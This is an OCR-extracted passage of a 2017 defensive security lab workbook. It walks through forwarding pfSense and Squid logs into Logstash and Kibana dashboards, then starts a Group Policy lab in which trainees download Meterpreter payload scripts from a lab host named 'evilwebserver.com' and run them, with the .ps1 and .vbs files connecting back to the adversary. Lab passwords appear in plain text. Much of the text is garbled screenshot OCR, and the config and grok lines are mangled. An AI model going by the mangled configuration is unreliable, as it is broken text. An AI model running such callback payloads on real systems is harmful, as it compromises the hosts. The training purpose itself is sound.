1! {progJ - / Aphp- tplll/ ( mutate {

length : 3,265 lines : 105

ln : 58 Col : 16 Sel: 0 I0

Unix (lf)

UTF-8

"
V
> INS

6. Analyze 30-outputs.conf
Finally, the "30-outputs.conf" file is being used to store the parsed events somewhere. In this case, we will instruct Logstash to write to an Elastic cluster running on our localhost. Note that other output types are also available and can be configured.

82

© 2017 Erik Van Buggenhout & Stephen Sims

['

Hom, Shatt

1nw-

+- · ¥ 1' > Th,s PC DVD Drrw (0:) D,y2 · ELK , logmsh

r ,.
Qu,clcacctss
~ .,OI, tDsolwdnol p~ L/ D:\Ell(\logn·sh\30-oUlpuls,conf· Not,pad..

Oate modif·rd

Docum ~ Pocturts
ELK
Ji Mu<ic

F,le Ecftt Sur<h View Encod,ng ungu~e Settings Tools MKro Run Plug,ns Window 1

o

e o~

C: · L ,. :c I

,:-, , ~

l) !:.i

1

~mCl1

ou,:pu,: ( 2 elasc1.cst!!arch

& Ona>rive

4 hosta ·> localhost.
5 G :Lndex · > "laoscas h-l l+YYYY . MM , dd l " I
# scdouc I codec·> rubydebuQ I
)
I

·
p D

Ln:9 Col: 1 Sd:010

UTF-8

INS

7. Analyze the grok patterns
As a final step, we will open the pfsense.grok file located in the patterns directory. As you may see, this file contains a number of lines, which all represent grok patterns. Let's take an example:
PFSENSE_LOG_DATA (%{INT:rule}),(%{INT:sub_rule}),,(%{INT:tracker}), (%{WORD:iface}),(%{WORD:reason}),(%{WORD:action}),(%{WORD:direction}), (%{INT:ip_ver}),
In this case, the following is true:
o PFSENSE_LOG_DATA is the name of the pattern
o The first item encountered will be treated as an integer ("INT") and the field will be called "rule"
o The second item encountered (after the comma) will be trated as an integer ("INT") and the field will be called "sub_rule"
0
Getting familiar with GROK patterns allows you to parse bascily any type of log source using Logstash! A great resource to validate & test GROK patterns is the online "Grok Constructor" available at http://grokconstructor.appspot.com /do/match.

© 2017 Erik Van Buggenhout & Stephen Sims

83

Q' D:\ELK\lo9stash\patlems\pfsensc.9rok · Notepad··

D X

File Edit x orch View Encoding language Settings Tools Mocro Run Plug,ns Window ?

X

o It-=' o o~

· "a -c -; i.i_ """' !!!'.-., Il - tJ lC Lil .;., I ~ ·l · litl Ia

~- -IH

lt-j

ol Hllf..,.,..,.go11

l # GROK ~tch pattern for loqstash.conf filter: \IPFSENS£_LOG_OATAJ\{PFS£NSE_IP_SPECIFIC_DA!AIIII A
:z f GROK Cuscom Patterns (add to pacterns directory and reference 1n GROK filcer for pfSense event

..3 t GROK Patterns for pfSense 2.3 Looo1no foni:at #
s J Created 2 7 Jan 2015 by J . Pisano (Handles TCP, t10P, and ICMP loq entries)

.(,i

t EdJ.ted 11 Feb 2015 by Elijah Paul elijah.paul@OttA1l.com t Edited 10 Mar 2015 by Bernd Zel.111.etz <bernd9bzed.de>

e

*· calcen from h'tep:,: //q1.11e. q1.thub . correhiahpaul/f5f32d4e911dcbi!edd2 - add1no PfSENSE_ prefix

l

·J - addJ.no carp patterns

t Osaoe: Use with tollow1no GROK 11atch pattern

t t

l I \(PFSENSE_LOG DATA ) \(PFSENSE IP SPECIFIC_DATA)l{PFSENSE_IP_DATAl\{PfSENSE_PROTOCOL_OATAl

1

PFSENSE LOG DATA (\(INT:rull!l), (\{INT : sub rule)),, ('{INT : tracl<er)), ('IWORO:ifac<e)), ('l(WORD : reasc

PFSENSE=IP_SPECIFIC_DA!A (\{PFSENSE_lPv4_SPEClfIC_DATA) I IIPFSENS£_IPv6_SPECIFIC_OAl'A))

l PFSENSE 1Pv1 SPECIFIC DATA (\(8ASE16NOM: tos l ),, (\IINT:ttl)), ll(Drr:idl), (\{INT: ottset}), (\{WORD: 1 PFSENS£-IPv1-SPECifIC- OATA ECN ,,1BAS£l6NOM : tos)), (l(WORD: eco)), (\(INT:ttl)), (\(INT,1d)), (\(INT:

tPFSENSE_IPvi_SPEClFIC_DAl'A_ECN l'IBAS£16NOM:tos)), (\(INI : ecn}), <·<INT : ctl)), (l(INT: idl), (\(INT:

:z PFSENSE IPv6 SPECIFIC DATA (l(BAS£16NUM:class}), (\(DAIA:~low label)), (\(INT:hop linu.t)), (\{WORD: I II

2 Pf'SE.~SE-IP DATA (\(INT: lenoch)), (\IIP:src ip}), (l{IP:dest 1p}),

-

<

---- ·-- --- ···----- .. PFSEN.. SE=PROTO_C,.O_,L._OAT,_A.

(
,,_

l

(

PFSENSE_TCP._. D·A-T-A}.l\{PFSENSE_OD.P.._·D-A·T-Al.l

\

{P.F. SENSE_ICMP.._DATAll

l(PfSENSE. _ICv

>

Nonmltert fil~ length: 5,105 lines: 56

Ln:20 Col: 14 Sel:010

Unix (Lf)

UTF-8

INS i

8. Open WinSCP and connect to ELK machine
As a next step, we want to copy the Logstash configuration files over to our ELK machine. As a first step, we will launch WinSCP to connect to our ELK machine. A shortcut to WinSCP is located on our Windows Desktop and we can configure it with the following details:

Hostname: 192.168.30.16 Username: sec599 Password: sec599

Again, as this is the first time we are connecting, we can accept the security warning presented by WinSCP (Click "Yes").

84

© 2017 Erik Van Buggenhout & Stephen Sims

Lou! Mori< Filn Comm,nds S.."°n Option, Remo<· Help

-

X

trl-<->1J,9t.-,2..W,..J,.-J0,6.-- -- - ~1cP=otiti?~ J
,It-.t:e-.f-fi_-,- - - - , -- . - - -
Sove ·

9. Copying configuration files to ELK host As we did in the YARA lab, we will configure WinSCP with the right directories:
o In the left-hand window, we will use the dropdown box to locate the D:\ELK\ folder (which is on our DVD)
o In the right-hand window, we will browse to the /11 tmp11 directory, which we will use as a staging folder to copy all of the configuration files
Once this is finished, we can drag and drop the following items from the left (local) to the right (remote ELK) window:
o The Logstash directory (including the Logstash .conf files & the "patterns" subdirectory)
o The "Geolite2-City.mmdb.gz" file (for IP location)

© 2017 Erik Van Buggenhout & Stephen Sims

85

..

local Motl< fi!G Commonds s.,....,,, Opt,ons Remote Help

· 83 I! "' ~hronllt r/1 ~ 0 21 0.-t ·

Tr>n<I«Sttt,n9> Dd1ua

· §·

l;I sec599Cl92.168.l0.16 Q, N,wS.,,,on

°""· 0,DYO D,y2 · I!} · ·

!'ij fll (.'lt! ~

[Z) r;:i ,l rinc1 Fitts 're,

Uplood ·
0,\ l lK- - - - ,
NIMO

· Ede · )( a:6 - Propott,H -Ci -Iii -:+:-8 -&.: - - -

Su:t T)1>0
p.,..,. ditt<toly
Folt 1...... Fol Uplood

tll7il01, .«iS6AM ~1~50AM

e1 f5, &] ~

- -,_- - - Sat Chlngt<I
- ''l'.",2017 114.1'PM ----~"-"~ ,_ 1 X 17l.-ol!)lPM

R,ght, rwrr ~u · ·
l'W'l'f·U· · t'W'kM:M1

o..n.,
tlo>toc tfHttU

l6,671 KB GZ

lO17 2:08:21 PM

rwx· · · · · -

-

v] 17~08'21PM 17 l:Cl:21 PM 17 2-oe:ll PM
20172.-09,:?0PM

rvtw.·--··· M'll······
M') -·-· l'WI,'······

··--rocl.
·OOI

CJ(

10. Launch Putty &amp; connect to ELK host
Next, let's launch Putty to set up an SSH connection to the ELK host. You can use the following credentials:

Host: 192.168.30.16 Username: sec599 Password: sec599

As this is the first time you are connecting to the system, you may receive a

security warning from Putty. As in previous exercises, we know the system we are trying to connect to and can continue by pressing "Yes".

--

....

86

© 2017 Erik Van Buggenhout & Stephen Sims

~ PuTTY Configuration

Category:

B·· Session
! :
; Loggilg
I
8 Terminal

I i

Keyboard Bell

l Features

EJ- \Vtndow

i ~ ,4wearanoe

I

1I ··-

Beh .
aVJO\Jf'

Transtation

Selection

Colotn
r- Connection

Data

Proxy

Telnet

Rlogin

I+, SSH

····· Senal

X

____ Basic options for your PuTTYsession

_,

Spedy the desmation you want to connect to

Host Name (or IP address)

Port

1192.168.30.16

,-2,2- - - ,

Conned.ion type:
Q Raw Q Telnet Q Rlogin @ SSH Q Serial

Load. save or delete a stored session
Saved Sessions

Default Settings

Load Save
Delete

Oose window on exit:
0 PJways O Never ® Only on clean exi

_ _0_ pen_ _1_ _Ca_ nce1__,

11. Switch user to root Once the SSH session in putty is running, let's switch to user root, so we can easily make changes to our ELK stack:
sec599@ubuntu03:~$ su root sec599@ubuntu03:/ home/sec599#
The password for the root user is "sec599".

© 2017 Erik Van Buggenhout & Stephen Sims

87

~ root@ubuntu03: / home/sec599

D X

12. Move files to the Logstash config directory We want to make sure Logstash reads our configuration files when it starts. Logstash used the /etc/logstash/conf.d/ directory for this. Any file placed in this directory will be parsed by Logstash upon start.
We can use the following commands to move both the configuration files and the patterns directory:
sec599@ubuntu03:/ home/sec599# mv /tmp/Logstash/* .conf /etc/logstash /conf.d/ sec599@ubuntu03:/home/sec599# mv /tmp/Logstash/patterns /etc/logstash /conf.d/
We also want to make sure the GeoIP database is extracted (it is currently compressed as a .gz archive) and moved to the /etc/logstash directory:
sec599@ubuntu03: / home/sec599# gunzip /tmp/Geolite2-City.mmdb.gz sec599@ubuntu03:/home/sec599# mv /tmp/Geolite2-City.mmdb / etc/logstash/

88

© 2017 Erik Van Buggenhout & Stephen Sims

13. Restart logstash to reload configuration
Once all Logstash configuration files have been copied, we will now restart Logstash:
sec599@ubuntu03:/home/sec599# service logstash restart

14. Review PfSense log settings
Let's open pfSense's web interface to configure our firewall. You can open a new tab in Chrome for this and open the pfSense admin interface (a bookmark has been added to your browser). The credentials for the pfSense management interface are:

Username: admin Password: sec599

© 2017 Erik Van Buggenhout & Stephen Sims

89

Once authenticated, we will open the "Status-> System Logs" menu. In this menu, we want to open the "Settings" page.

C A No t S"Cu r~ ~ 192 168.10.1 · u J ,,mng;.php

'q_~e.~ ~ I "

·

"

MISP

·

'

·

e

'

"

' "

C,

X

* Q.

·

Status / Systern Logs / Settings

0

GUIL0 9 -

S: .,.nl$ :tQN1tt'll"nl.offltw til lQQN1n'"">O~,ea1n r.,,,,, 4UI l1<k1" Mr. 12rfK!f\CNfflllft#ta~' ~· 1Jt con;.,,r,,:J'ltltnt>v.lu.t -100~

l~~ne.-stn~:-e:~an:,,s.., taiatue· Thts~t":2 Of"':·0t1i"Ow ·~",Y,hkYJ~II al'd~ elf"!'~ ihStt~,c.raxr.'l· :etJ !IOOJl\tpt-. »9h.MICI tt.~ t · P M-oll7:!'0kfiC'ftbQf;c,s

~~me,~ ftC,'illf'tWftt'n!

·'JnSce'""·too &,

t«J1E LO,Otl:~tafc;"fla,"()eid ~'lleM Tfllf'.S <J " ~t:tdrotedOl'de "'e'l1 TotrrVN~lffil"Gf'Hf-11W..atGfttlt'kJQI\ l. "'stl4YC1
V-~t-t:c 1ht'nC~ ttrt 1og-ti.rsino ·~"S;;tlt"Jt0Qf1zt1 °"' Cl0f4!' !'>C' OO'M'IUW~:i,e, 8c-ew.,t'U'l,4t-,cttattiQtrutn11,o!!:rn(_1ctstt""' toClltil.t»'"_.f-'lr.JllhC ..a "' ~ I . ' : :

~ W. loglfit ..~

lo;' pld,eft m11~rtec1 , ~ !l'tt e,ttf,\,111 pus n.i.~ pi..- in tr:~ n.,.~s~ ~ ~ite· C'U' !'d·art.no·rd o-,t:"'cCff.: v:"1(~!.,.A,0,1-s,n,:,e Pt-f'\161:~00' C,,l'l'Jdrtt '"'l't"l;.:t'O
15. Configure PfSense syslog forwarding In the System Logs settings page, scroll down to the bottom of the page and do the following: o Check the box for "Enable Remote Logging" o Source Address: CSOC (This is because our ELK stack is expecting logs coming from the CSOC interface of the firewall) o Remote log servers: 192.168.30.16:5140 o Remote Syslog Contents: Everything This will configure our PfSense firewall to send all syslog contents to the remote system 192.168.30.16 on UDP port 5140. Once configured, press the "Save" button to save your changes.

90

© 2017 Erik Van Buggenhout & Stephen Sims

I 1(,. . . .

e

0 X

~

C A No·secure ~ 192.168.10.1 '"'' s gs

ee Pf'Sc.,. ;,_..i '<( Cu<loo Sandl>ol< I) Somp1.. · EYl'-b,. I) K_,.,,.

,,.,.,,1t-¥1 R«etL09Fltn

NO$W$

Q*

,._.·t C\e· s lftlot4t kiq fi,',e$ end1~1!'· theflt at -:m~, ~ i111a ··a r>ttUrt.t 'f')e C:HCP ~ u111e aw SI · blJttQf'I ~enyk~<;f\tno,,!t,.,.""'
~t made

Romot· Logging OpHons

Sourc:e-Adcltn·

CSOG
TM°"· onwm. ,,,,. ~Jo:.);tf'fOGHfOOn(OW'IOIO. ~ F ..odfus. .!lnet '"'and1P tdl1tttttt If. . . ..P lSji,C~K,rtmot~ ,·,s~ ~\!':'>
t1 all~ Of ·ha, JP t)'Oe ToTT'l'l r-.,,i INS 1Pv6 fft'n(,"· t.ystoQ W't't!S a:l'ld-:o.Ml lt\·fflacH

IP PNliOOOI Remcnkl09M.1Wt1

P 4
SQPhot\lSONy \i.J.t'a¥-1\tn IN»-Of""MI f~ft'S,'$ .. ~~ .n·nf' '""""" ~~ ll'ille(''iOr.CNV~J:ttU.U. pr"1t~~, it ontP.,tOOfe-'d or mt '!'lecteotype«srrot~onme~cn mt,t.te.ftCV\e t r.ie·· ~u,e
191: 1~ 30 :&514.)

f;' twelEYffl'I,. ONS E<wems.(Re$tU'tN, unD<AJno.Forv.itJd!fid~S.l'I\ISQ ~ttdt.$1 OHC? E'Htt\11 (DliCP OHl'l"IOf1 OHCPA'@Cav DHCP 0tifflt/ PPPf..-Ntt&IPPPoEWAN Ct~l2TPWJ.IJ Cl~\ PPTP Vl.t.NCt!!!fl:1/
C·ir.i\· Pon· I £,~na
vt-HE\tn'I Psee.O~'t'Pt-..L.:7P,PPPcE~tt) G#!e w·; MOf'lftOI E,-et1ts l!<MW'Q 0 . - - , t (IW>VO. UPnP RIP.OSPF, BGPj

16. Create ELK index Let's open our Kibana web interface again. On the page where it is asking you to create an index, we can now refresh the "Time filter field name" field. This should result in the automatic selection of the "@timestamp" field, which indicates events are arriving (& that these events have a @timestamp field).
We can now create our index by pressing the "Create" button. This will create a Logstash index with the @timestamp as the "Time filter" field. Once finished, this will open the Index page and you will receive a listing of all available fields (which are the results of our logstash configuration).

© 2017 Erik Van Buggenhout & Stephen Sims

91

C A Not s..::ur~ ~ . 192.168.30. 16 r ·t> ' 0 /Man.>g~c. ..,,,. n.. index7 g·O

CJ ~ PIS«1s, fftwa ~ Csc.<coo S..dbo> [) Son,pJ<> - Ev-...-

K'ob&M

MISP

I kibana

tment I l\1ba
Index Patterns Saved Objects Advanced Setnngs

e

a X

., *

1:1
'-io defeuft &t"dex p.tt~"l':; Vo..i mu~! se: ,ea o< crl!a::e ore to continue.

Configure an index pattern
In order to use k b.,na you must configure a: !east one index pattern. Index patterns are used to
ldent fy the Eli!stJCsearch index to run search and analytics against They are aiso used to conf1gvre
fields.
Index name or pattern
logsr<1sh-

Tlme Filter fleld name 0

Expand index pattern when searching (DEPRECATED]
,N,.._t- :t11s: op.:.or H-1tt:4!-d. 1:~·l'che-s ·p,nst ary :·~it'd 1"'dex p..c..-rr that cOr"tU.f'S a v..ildutd ,·.- ,,:,.:.oma.tc.al., b4! f!Xpdl"'C!.ed co Q!Jf!r\' ort1tt-e 1rcltts tr'e: cort.11r deo:aw1ct- n tN!- C\K:"'t''l":.I:, ~·t-ere'd :.i""e: range
Se.ucr.;r-g .sia,nst tne tr'lde-< Pi:tem logsras~· w I·cru. y qvery Ela1:.<.seb1'd- for tt-e spe:crfic mo1tr1r:g 1rd,ces \e.g

Use event tl'lles to cre.ite index names [DEPRECATE!:>)

17. Review raw events in Discover So, let's start exploring our Kibana interface! Kibana consists of three main components:
o Discover: Where you can see the raw events that have been parsed by Logstash. You can create filters here and search for specific data. These searches can be saved.
o Visualize: Where you can create & save visualizations on your raw data (e.g. pie charts, histograms,...)
o Dashboard: Where you can combine visualizations & searches that can be analyzed by analysts.
As a first step, let's look at the raw events in "Discover".

92

© 2017 Erik Van Buggenhout & Stephen Sims

[JKib4no

f-

C A Not secure ~ 192168.30.16'ap,.

,,./d!UO'tfl' g· ?,_

D 0 ~ P&-fnwall ',< Cuda>oSanciool

Somples-EY,w,.,b,.

~

N«w< .. Ml5P

New

SJve

Opeo

Share

e

X

' *

< (!) L.l>t · 5 m1nu1es > ·

'>edrch 1e.g. statas:200 ANO ~~1ens1on.PHPJ

Add a ' ter +

loptash-·

0

Augu,.I 271112017, 05:28:13.616 · August 27th 2017, 05:4.3:13.616 - A.U!O

Selected Fields

,s

0

Available Flekls 0
O Ctimut.,.
I .od
I _score
t _type t ·-c:or

0

TIme

sourc.e

· Auou~t 27th 2ov· , OS :·3 :11. 000 rrque:st; log,I'\. hve. co,11:443 q-fflt: .._.. aulh: i~t: - Vffb: CO'-~ECT .«14.c: 192:,168,10.16" - -
~27 ·ua. 201:':0'7:·3:ll ·0200) "CO'i,..ECT log,n.1we.co
m:«3 tfTTP 1.1 S03 0 "·" ·.· T~NO~:ltlE.<t..,-.O,E ty~: sysloo pt'OI: (squ1d-l) he,: squ1d, _datepar-

t ·uth

18. Saved Searches, Visualizations &amp; Dashboad
In order to get you up & running, we have added a number of Searches, Visualizations & Dashboards already. You can find them as .json files on the Windows desktop directory under the ELK folder.

t3 I

~ E.LK

HIM Home

Share

View

¥ 1'

· This PC · Desktop > ELK

t- Quick access

· Desktop

..... Downloads

··, Documents Pictures

,,1'

J-: Music

Pnvil~e Escalat;on

Videos

Name
a 01 - Di5cove,- · Seuch Events.json a 02 · Visualizat1ons.json a 03 · PfSense Dashboard.,son

.,_ on,,Dnv"

'This PC

Nl!twork

V Cl Search n,._

Dale mod,fied

Type

8(',0/2017 2.00 PM 8/30 201; .!,01 PM 8130/2017 2:00 PM

JSON Ftle JSON Fite JSON File

· X e
p
s,u
1 KS IHS ~ KB

19. Import Searches, Visualizations &amp; Dashboards
To import elements in Kibana, we can select the "Management" menu on the lefthand side of the web interface. Once this screens opens, we will select the "Saved Objects" subsection.

© 2017 Erik Van Buggenhout & Stephen Sims

93

In this new menu, we will select "Import" on the right-hand side of the screen. We can then select the following .json files that are available on the Desktop under the ELK folder:
o 01 - Discover - Search Events.json
o 02 - Visualizations.json
o 03 - pfSense Dashboard.json
Should Kibana return a dialog prompt, please select "Yes, overwrite all", which will
ensure you have a clean set of Searches, Visualizations & Dashboards.

Note that the Import window does not allow a multi-selection, so you will have to select the three files individually (repeat the Import step 3 times).

e

(] K,b·n·

x

~

C A Not secure ~ 192.168.30.16/ap ·"l · ma~.,~~Vl·~ <>J , '_ 08:_a= ·ab:da,llb0,3rds)

'< ::> W Pf'S<o,e ,.,..,.I

CuckooSond00x C) Sample< · E-,,1v,,bs, [] 1-Jbana

NruU1 ~ '-<ISP

* '

· 1' · Th~ PC Desktop , HK

.., C,

· Desktop
... Oownlood, ., Oo<umc-nts ~
... Pldurc:s ELK
j, Mu,,c

fA 01 · o,,c.,.., · Surd, Event<j,on
~ 02 · V,su411uhon.s.p.on
l!"A 03 · PfSm>t Odlboord,1<on

Sur<h !LK

X

p

,I I 51,1:i- e · CJ

b1e,y.htng

enc)J2Q1"~PM t, ,01·2 rM 8/lCli2017i 00 PM

,~

of Sdved Objects. Typically

JSC;.·J Re t- instead of this sereer

· on.om,,
· lh,sPC

rot· ~ Nmc::

Otscover · St.rch £\rents.port ~ All Files

I H Optn

C.ncd

20. Open PfSense - Dashboard Once the import has been completed, let's select the "Dashboard" in the menu on the left-hand side. This will open all available dashboards in the Kibana interface.
We can then select our PfSense Dashboard "PfSense - Dashboard" that we imported.

94

© 2017 Erik Van Buggenhout & Stephen Sims

[J Kib.no

IC

~

C A Not secure ~ / 192.168.30.16 ·PP/ll~ cumlx>¥ds'_g·O

Dashboard

[J -

Ntu·s · ',!ISP

0. Search..

a

rtse n:;e · Dashboard

8

0 X

*

1-1011 ( ) 1-1 Of 1 ( )

21. Review visualizations in PfSense dashboard Once opened, take your time to go through the PfSense dashboard. Feel free to interact with the different visualizations and see how they are built. We have built the dashboard in the following way: o The first few rows are built of visualizations that provide statistics, histograms & pie charts on the type of traffic that is being assessed by the firewall. o At the bottom of the dashboard, we have included a "Search" that includes the raw events for analysis.
.......
.......

© 2017 Erik Van Buggenhout & Stephen Sims

95

[I PIS,n,e · D·sr.bo>«I I X

f-

C A Ncit HCUre ~ ·92 168-30.16 a , ~· aunt>oar<1 roa boa a q

f8 PIScnoc 0,.... '<.' Cuc~oo 5-oo>
I kibana

D ~ ·_., I] IJbon>
I f>IS.:nse OJshoo.-.rd

~ Ntfl<.·

· o·K'lptlCtl'

ers: opt

8

· X

* I · cur, hffll· J:3""

< Shale Cioni> Ed t

0 UIM 1S mlnul >

-~ '......~

- .:-,-~.·'

Even!VT e
.i·0.:,

, · Pr

. .

0

0 ·uc1p

~ .. 1.. .1.. I 0

. 0
, Dem\a!lOO Port
o · m~
. 547
0

0Umeatamp Poff 10 NConcb
Tmf'

., ~nnat :-i P

22. Applying filters on dashboards
As a final step, let's try doing some analysis on the available data in t he dashboard. You might have noticed already that by clicking on one of the diagrams, you can immediately drill down on information that is available.
As an example, try clicking on one of the destination port numbers in the visualizations on the second row, which will create a filtered view of the dashboard that only represents the data you selected.
In the screenshot provided, we click on destination port 547, which will refresh the dashboard to only show events with destination port 547! This is hugely powerful when you are performing analysis work.

96

© 2017 Erik Van Buggenhout & Stephen Sims

I [] PISt,we · Dos'>boord · I ><

e

0 X

~

* C A N<,· 1«1,re ~..... 192 168.30.16 ·~/cushboar<1./03".hbo.ml'_g=O& ··ldescnpl!On: t 1t·rs:!0optionE(dar1<Thffll~ pa.,..

PIS<.,._.~ f8)

,C- C.irtoo S . - , [', S-l)lot · E,,ii...t,s, I] k1boN

,-...,..,

MISI'

PfSensi, Dashboard

Share ClonP Ed,t < 0 u ,r 15 minute' >

Add· ·
.-C 6
.0., ·

.. Protocol

. .

~. 111.J 0

c·udp

I

6-S,1

1656.00

00

«Junw~nlp pet )0 HCOncft

.. Dest nation Port

·o· . ...7

0

o e s:ns
e s-1

..

Exercise 2 : SECS99-2.4 - Bonus
As a bonus exercise, if you have the t ime, we'll ask you to adapt t he provided dashboard and add a visualization related to the Squid proxy logs. Let's assume we want to analyze what the spread is of used HTTP methods by the clients in our network. Can you create a pie chart that visualizes the spread? (GET, POST, CONNECT,...)
1. Open "Visualize" window So, we want to create a new visualization that can be added to our dashboard... As a first step, let's open the "Visualize" menu on the left-hand side of the Kibana interface. This will provide us with an exhaustive listing of all currently created visualizations. The display will show you the visualization name and their type.
We can create a new visualization by clicking the"+" button in the middle of the screen.

© 2017 Erik Van Buggenhout & Stephen Sims

97

[] ~.....

X

C A Not s«11te l>0-1!",:' J 192.168.30.16 applklbar,1·1vtsu., ~ ..g·

1(" C..c'cooS.- ~ s.,,--. £..._ff>,. (3 -

li-=s w M1SP

Visualize

i..l. Vertical84r
0 P,e
Ii!,!. Vert·CJI BJ'

8

D X

* :

1-1 Ol 11 ( )

2. Create new pie chart
In the next window, we will select the type of visualization that is to be created. We will select a "Pie Chart", as this is a good way of visualizing the different firewall actions.

C A Nol~=,. ""1!>"1 192 168.30.16 opp/I bana·'vlsua zttnew' 9
[] '""'"° t<,ss.,1 · 1,AISP
I Nev;

6

D X

* :

Select visualization type Basic Charts

Areil

tieatll. p

3. Select "Events" saved search
In the next window, the "New visualization" wizzard will ask you what data set is to be used to create the visualization. We will select the "Events" search we imported as a source of data. Alternatively, we could also select the entire index,

98

© 2017 Erik Van Buggenhout & Stephen Sims

but by selecting one of the saved searches we have more finegrained control over the type of data we would like to visualize.

)(

I ( , - ~ ~

C A Not s«ure ~

fol F&nwF--·

, 192.168.30.16 ~pp/k,lwut'/~·sudzWnew co:1<1911r~?typ. pie& irO

ll - D ~-E,,;i,.,t,s,

lffiM "~·ISP

/ ChOO'St search sourct

6

· X

*

From a New Search, Select Index
Q Fi ter Narne ·

Or, From a Saved Search
Nam~ · E

4. Configure pie chart I n the next screen, we see a blank pie chart that we now need to configure. We want to indicate what type of data we want to visualize. We will select "Split Slices", which will split the pie chart in different slices.
e

f8 PIS<,,~ , ,.,_ I( (,><IO>O s«,cibO, ['J s.,,,p,·s · Evi..dl,~ I] ~ · -

( kibana

I NewVlsuahzalfon(u11saved) unfed to Saved search "E,ents· l'l,

Addar. +

loptash-·

""
metrics

Ntts.., ,r MISl'
0
X

buckets

Sov· Shore RefrPm < 0L.Ml'Smrr11.M > o ·counc

Ill

0

5. Define aggregation of "terms"

© 2017 Erik Van Buggenhout & Stephen Sims

99

As a second step, we need to define the type of data we want to compare. In this case, we want to know the spread of HTTP methods, which are considered "Terms" in Kibana (in essence, we just want to "count" the number of times those "terms" occur in our dataset) .

( ] lCib·n>

X

8
E ~ ·· e<> <~t

· X
* :

I ~.ew v1sualizat10n (unsaved) L10kt'd to Sal/e<l 5edrth "£11('nti° ~
+

0
JC

o e couru

<·D

Date Htstogram Hrstog·a,y,
11.tngP
Date Range IPv~ RilORt
~ lters S11mrf1<<'tn: Te-ms

6. Select HTTP "verb" field

The HTTP method field name in Logstash's "HTTPDCOMBINEDLOG" grok pattern is

called "verb". We will select the "verb.keyword" as a field.

.....

7. Test visualization by pressing "Play" icon

As a final step, we can test t he visualization by pressing the "Play" icon. This should result in a nicely coloured diagram that illustrates the different HTTP verbs and their spread!

100

© 2017 Erik Van Buggenhout & Stephen Sims

8

· X

)(

f-

C .A. Not ,ecvre ~ 192168.30.16 1pp/l,bana·,'vt1<JiliU/C·e·te'type:~uvedSearchld·Eventst.c_9:Q& az(filte,s.-l(). ,nbd tqa~

*

f8 - . . - V: cuc1a>os.- D ~ - e - [I....,_ .) ,..._ MtSP

, New Viswllzatlon (un~I

Save Sha·e Retre- < 0 Last 15rnlmMs >

Linked to s,wed search ·events" ~

+

0

Terms

·a-
1 1111ow

0 e POST
e COflMCT

ve, b,keyword

<reuk Count Order

8. Save the visualization
Finally, we can save the visualization by clicking the "Save" button on top of the page. We can then provide a meaningful name to our visualization. When creating visualization (& other Kibana obj ects) in your organization, it's a good idea to define and respect a certain naming convention.

8

· X

,c
* C A No· u,cure ~ 192.168.30.16 applbt>ana·'IMua H ,..,_.te?type pe& a>..SJHrd>ld ven!S&._g= & 4 (I lff>' 1nlced LQUfl

C; S.,-,,pie> · b i- w I] ICibono

,_,...,, I II~

-w verb! ·unsaved)

'im,e Share Rtfre- < 0 Lasr Sm nut~ >

Save Vlsualizauon

0

m

lop tash-·

0
a-

0 e POST
e COt;NECT

verb keyword
O,..rly
~·etnc Count
Ordt>r
.or r"lfilr ..,.__;,'-..,)...,-~------.....;Q._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _- ' i

9. Add visualization to the dashboard

As a final step, we can go back to the dashboard, click "Edit" and add the

visualization to the dashboard. This will ensure all analysts that open the dashboard

© 2017 Erik Van Buggenhout & Stephen Sims

101

will be able to leverage your newly created visualization!

Note t he "ease of use" and tremendous flexibility this provides to analysts! By knowing these basic principles, we can create highly customised visualizations & dashboards that can help us detect suspicious behavior in our environment!

8

0 X

Add Panels Q. VISUa!.us· ons e O~·N·· n P

< > 5dve Carv;el 4dd Optrons Sh4re

0 Last 1!, mlnUl,c>.

~ nat on PorVTIMe

HTTP Vertis Protocol

102

© 2017 Erik Van Buggenhout & Stephen Sims

SECS99-2.5: Exercise - Controlling scripts using GPO's
Objective
The objective of the lab is to configure Windows domain-level GPOs (Group Policy Objects) that can be used to control script execution in the enterprise. We will configure and enforce our hardening controls from our central domain controller.

We have seen a number of ways for an attacker to execute scripts on user's devices. We will make sure all of the aforementioned script types are blocked from running. In short, we will:

1. Create GPO that will: o Disable macros using the Trust Center o Disable Windows Script Host using the registry o Disable PowerShell scripts using Software Restriction Policies
2. Enforce GPO across the Windows domain environment 3. Test actual blocking of our payload execution
Scenario Virtual Machines
1. SEC599-C01 - Windows 2. SEC599-C01 - DomainController 3. SEC599-C01 - Kali 4. SEC599-C01 - Firewall
Exercise 1: SEC599-2.5
The objective of the lab is to configure Windows domain-level GPOs (Group Policy Objects) that can be used to control script execution in the enterprise. We will configure and enforce our hardening controls from our central domain controller.

1. Authenticate to Windows
As always, let's start up by authentication to our Windows machine. If you don't know the credentials by heart yet:

USERNAME: Nick fury PASSWORD: Awesomesauce123
2. Download samples from www.evilwebserver.com Once authenticated, please proceed by downloading a number of samples from www.evilwebserver.com. This web site has been added as a bookmark in Google Chrome.

As we are looking at script protection, download the following files:

© 2017 Erik Van Buggenhout & Stephen Sims

103

o payload.psl
o payload.vbs
o payload.js
In order to download the script files, please right-click them and select "Save Link As...". You can download them wherever you like, although it might be easiest to download them to the Desktop.

~ lnde>. of /samp·es

X

· f-

C (D www.ev1lwebserver.com J rnplP"'

'< ~ PfSense Fire· ,

Cuckoo Sandoox

Nessus -io"l'e / Login

 Googe Chrome sn·t your oefa·J t orowser.

Index of /samples

MISP ~ Samples · Ev1fY,ebse

Last modified ~ Description

~ Parent D1recton·

~ pavload.dU

2017-08- 11 15:39 5.0K

~ pavload exe

2017-08-11 15.37 72K

~ paYload,hta

201 7-08- 11 15:38 7.2K

~ pa\·load 1s

2017-08-11 19:26 122

~ pavload,psl

201'-0S- ll 15·39 3.3K

~ pa\·load \bs

201 7-08-11 15.38 7.2K

~ pavload refleCllon psl 201 7-08-11 15:40 2.8K

Apache Serw1r at u-,,w,tn 1hrnbsen er com Port 80

3. Payload execution In the next step, we will attempt to run the different payloads. They might not all immediately "work", but they shouldn't be restricted from being executed... For info: The payloads are standard Meterpreter payloads in different formats, very similar to the OpenOffice document we used on day 1.
The .psl and .vbs file will attempt to connect back to the adversary, while the .js just innocently opens up a notepad window :)
For the .js file, you may receive a window asking with which application you want to open the file. If this happens, please select the "Microsoft Windows Based Script Host".

104

© 2017 Erik Van Buggenhout & Stephen Sims

Open File - Security Warning
Do you want to open this file?
Name: C:\Users\niclc.fury\Desktop\payload.js Pubhsher: Unknown Publisher
Type: JavaScript File From: C:\Users\ nick.fuiy\Oesktop\ payload.JS

0 Always aslc before opening this file

Open

Cancel

